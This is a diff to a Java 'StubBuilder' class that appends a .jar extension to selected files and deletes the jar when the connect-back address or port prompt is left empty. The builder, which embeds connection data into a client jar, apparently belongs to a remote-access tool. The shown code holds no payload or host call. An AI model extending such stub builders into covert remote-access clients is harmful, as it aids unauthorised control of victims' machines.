@@ -27,6 +27,7 @@ public final class StubBuilder {
 	private static final String ADDRESS_MESSAGE = "Which address should the client connect to?";
 	private static final String PORT_MESSAGE = "Which port?";
 	
+	private static final String FILE_EXTENSION = ".jar";
 	private static final String FILE_NAME = "/connection_data.txt";
 	
 	private StubBuilder() {
@@ -44,7 +45,13 @@ public final class StubBuilder {
 		final int input = open ? fileChooser.showOpenDialog(null) : fileChooser.showSaveDialog(null);
 		
 		if (input == JFileChooser.APPROVE_OPTION) {
-			final File file = fileChooser.getSelectedFile();
+			File file = fileChooser.getSelectedFile();
+			
+			final String name = file.getName();
+			
+			if (!name.endsWith(FILE_EXTENSION)) {
+				file = new File(file + FILE_EXTENSION);
+			}
 			
 			return file;
 		}
@@ -76,13 +83,17 @@ public final class StubBuilder {
 	private static void replaceFile(final File jarFile) {
 		final String address = JOptionPane.showInputDialog(ADDRESS_MESSAGE);
 		
-		if (address == null) {
+		if (address == null || address.isEmpty()) {
+			jarFile.delete();
+			
 			return;
 		}
 		
 		final String port = JOptionPane.showInputDialog(PORT_MESSAGE);
 		
-		if (port == null) {
+		if (port == null || port.isEmpty()) {
+			jarFile.delete();
+			
 			return;
 		}
 		
